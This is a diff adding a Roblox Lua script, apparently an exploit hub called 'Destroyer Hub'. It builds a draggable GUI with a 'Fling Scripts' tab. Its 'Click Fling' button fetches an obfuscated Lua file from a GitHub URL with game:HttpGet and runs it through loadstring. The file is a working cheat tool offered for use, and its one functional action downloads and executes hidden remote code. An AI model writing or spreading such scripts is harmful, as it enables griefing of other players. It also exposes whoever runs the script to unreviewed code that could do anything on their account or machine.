@@ -1,0 +1,95 @@
+-- Create a ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer.PlayerGui
+
+-- Create a Frame for the main GUI
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0.5, 0, 0.5, 0)
+mainFrame.Position = UDim2.new(0.25, 0, 0.25, 0)
+mainFrame.BackgroundColor3 = Color3.new(0, 0, 0) -- Black
+mainFrame.BorderSizePixel = 5
+mainFrame.Parent = screenGui
+
+-- Create a title text label
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0.1, 0)
+title.BackgroundColor3 = Color3.new(0, 0, 0)
+title.TextColor3 = Color3.new(1, 1, 1) -- White
+title.Text = "Destroyer Hub (V0.1)"
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 18
+title.Parent = mainFrame
+
+-- Track whether the main frame is being dragged
+local isDragging = false
+local dragStartOffset = nil
+
+-- Function to handle mouse button press
+local function onMouseDown(mouseX, mouseY)
+    isDragging = true
+    dragStartOffset = mainFrame.Position - UDim2.new(0, mouseX, 0, mouseY)
+end
+
+-- Function to handle mouse movement while dragging
+local function onMouseMove(mouseX, mouseY)
+    if isDragging then
+        mainFrame.Position = UDim2.new(0, mouseX, 0, mouseY) + dragStartOffset
+    end
+end
+
+-- Function to handle mouse button release
+local function onMouseUp()
+    isDragging = false
+end
+
+-- Connect mouse events for the main frame
+mainFrame.InputBegan:Connect(function(input, gameProcessedEvent)
+    if not gameProcessedEvent then
+        onMouseDown(input.Position.X, input.Position.Y)
+    end
+end)
+
+mainFrame.InputChanged:Connect(function(input)
+    onMouseMove(input.Position.X, input.Position.Y)
+end)
+
+mainFrame.InputEnded:Connect(function(input)
+    onMouseUp()
+end)
+
+-- Create a Tab button
+local tabButton = Instance.new("TextButton")
+tabButton.Size = UDim2.new(0.25, 0, 0.1, 0)
+tabButton.Position = UDim2.new(0, 0, 0.1, 0)
+tabButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2) -- Dark Gray
+tabButton.TextColor3 = Color3.new(1, 1, 1) -- White
+tabButton.Text = "Fling Scripts"
+tabButton.Parent = mainFrame
+
+-- Create a separate Frame for Tab 1 content
+local tab1Frame = Instance.new("Frame")
+tab1Frame.Size = UDim2.new(1, 0, 0.8, 0)
+tab1Frame.Position = UDim2.new(0, 0, 0.2, 0)
+tab1Frame.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4) -- Light Gray
+tab1Frame.Parent = mainFrame
+
+-- Example button inside Tab 1
+local flingButton = Instance.new("TextButton")
+flingButton.Size = UDim2.new(0.2, 0, 0.1, 0)
+flingButton.Position = UDim2.new(0.8, 0, 0, 0)
+flingButton.BackgroundColor3 = Color3.new(0, 0.5, 0.2) -- Green
+flingButton.TextColor3 = Color3.new(1, 1, 1) -- White
+flingButton.Text = "Click Fling"
+flingButton.Parent = tab1Frame
+
+-- Connect event for the Fling button
+flingButton.MouseButton1Click:Connect(function()
+    print("Fling button clicked!")
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'), true))()
+end)
+
+-- Connect events for the Tab button
+tabButton.MouseButton1Click:Connect(function()
+    print("Switched to Fling Scripts")
+    tab1Frame.Visible = true
+end)
